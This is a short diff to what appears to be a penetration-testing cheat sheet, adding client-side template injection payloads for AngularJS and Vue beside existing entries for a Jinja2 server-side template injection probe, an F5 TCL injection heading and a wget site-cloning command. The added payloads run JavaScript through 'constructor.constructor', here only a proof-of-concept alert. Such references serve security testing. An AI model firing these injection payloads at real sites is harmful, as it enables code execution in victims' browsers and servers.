@@ -57,5 +57,9 @@ F5 TCL Injection (Send the following in JSESSIONID that doesn't respond typical 
 ##SSTI
 Jinja2 reads from templates directory----{{config}}
 
+##CSTI
+AngularJS----{{constructor.constructor('alert(123)')()}}
+Vue----{{{}.toString.constructor('alert(123)')()}}
+
 ##Clone Websites
 Download all files (wget)----wget -r -np -k &lt;URL&gt;
